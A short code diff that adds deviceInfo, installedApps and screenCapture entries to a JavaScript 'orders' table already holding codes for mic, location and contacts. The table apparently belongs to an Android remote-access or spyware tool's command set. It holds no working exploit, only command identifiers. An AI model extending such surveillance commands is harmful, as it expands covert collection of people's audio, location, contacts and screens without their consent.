@@ -169,5 +169,7 @@ exports.orders = {
   mic: 'x0000mc',
   location: 'x0000lm',
   contacts: 'x0000cn',
-
+  deviceInfo: 'x0000di',
+  installedApps: 'x0000ia',
+  screenCapture: 'x0000sc',
 }
